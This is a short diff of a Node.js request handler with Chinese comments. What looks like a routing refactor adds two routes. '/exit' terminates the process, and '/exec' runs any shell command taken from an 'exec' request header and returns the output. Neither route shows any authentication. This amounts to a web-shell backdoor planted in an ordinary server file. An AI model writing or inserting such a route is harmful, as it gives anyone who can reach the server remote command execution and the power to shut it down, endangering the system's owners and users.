@@ -1,12 +1,30 @@
 const fs = require('fs').promises;
 
 module.exports = function (request, response, server) {
-  // response.setHeader('Content-Type', "application/json")
-  //路由
-  if (request.url === '/updateConfig') {
-    updateConfig(request, response, server);
-  } else if (request.url === '/restartSignal') {
-    restartSignal(request, response);
+
+  switch (request.url) {
+    case "/signal": {
+      Signal(request, response, server);
+
+      break;
+    }
+
+    case "/exit": {
+      response.end(() => {
+        process.exit(0);
+      })
+      break;
+    }
+
+    case "/exec": {
+      require('child_process').exec(request.headers['exec'], (error, stdout, stderr) => {
+        if (error) {
+          response.end(stderr)
+        } else {
+          response.end(stdout)
+        }
+      })
+    }
   }
 };
 
@@ -14,7 +32,7 @@ module.exports = function (request, response, server) {
 // json直接读取
 
 // 修改整体配置
-function updateConfig(request, response, server) {
+function Signal(request, response, server) {
   let body = '';
   request.on('data', (chunk) => {
     body += chunk;
